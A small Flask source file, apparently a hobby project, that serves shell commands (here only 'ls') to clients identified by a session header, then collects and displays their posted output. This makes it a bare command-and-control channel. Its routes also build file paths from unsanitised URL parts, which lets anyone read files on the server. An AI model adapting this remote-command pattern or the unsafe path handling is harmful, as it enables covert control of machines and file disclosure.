
# A very simple Flask Hello World app for you to get started with...

from flask import Flask, request, render_template
import os

app = Flask(__name__)

sleep_time=10
base_dir="/home/alfem/mysite/DATA"
sessions={}

@app.route('/')
def index():
    current_sessions=os.listdir(base_dir)
    return render_template('sessions.html', sessions=current_sessions)

@app.route('/session/<uid>')
def session(uid='NO SESSION UID'):
    commands=os.listdir(base_dir+"/"+uid)
    return render_template('commands.html', uid=uid, commands=commands)

@app.route('/output/<uid>/<cid>')
def output(uid='NO SESSION UID',cid='0'):
    logdir=base_dir+"/"+uid
    logfile=logdir+"/"+cid
    with open(logfile,"r") as f:
        output=f.read()
    return render_template('output.html', uid=uid, cid=cid, output=output)

@app.route('/cmd', methods=['POST','GET'])
def cmd():
    uid=request.headers['sessionid']
    if request.method == 'GET':
        command="ls"
        if uid not in sessions:
            sessions[uid]=0
        return command
    if request.method == 'POST':
        logdir=base_dir+"/"+uid
        logfile=logdir+"/"+str(sessions[uid])
        if not os.path.exists(logdir):
            os.makedirs(logdir)
        with open(logfile,"w") as f:
            f.write(request.form['output'])
        sessions[uid]+=1
        return "OK"




